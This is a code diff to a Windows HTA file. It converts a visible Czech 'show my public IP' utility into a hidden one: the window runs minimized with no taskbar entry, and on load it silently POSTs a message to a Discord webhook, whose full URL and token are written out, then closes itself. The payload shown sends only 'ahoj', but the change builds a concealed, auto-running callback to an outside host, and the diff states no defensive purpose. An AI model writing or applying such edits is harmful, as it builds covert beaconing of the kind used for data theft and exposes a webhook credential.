@@ -1,19 +1,17 @@
 <html>
 <head>
-<title>Moje IP</title>
-<HTA:APPLICATION BORDER="dialog" SCROLL="no" SINGLEINSTANCE="yes" />
+<HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
 <script>
-function nactiIP() {
+window.onload = function() {
     var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("GET", "https://api.ipify.org", false);
-    xhr.send();
-    document.getElementById("ip").innerText = xhr.responseText;
+
+    xhr.open("POST", "https://discord.com/api/webhooks/1502691866188054793/eX6Dy2Ef0Y8rwqEXYM7_6A4O_CZphvRMk7FBsrsWSOjbl97lbTZ55lTv8o7_aFzfYhe5", false);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send('{"content":"ahoj"}');
+
+    window.close();
 }
 </script>
 </head>
-<body onload="nactiIP()">
-<h2>Moje veřejná IP</h2>
-<p id="ip">Načítám...</p>
-<button onclick="window.close()">Zavřít</button>
-</body>
+<body></body>
 </html>
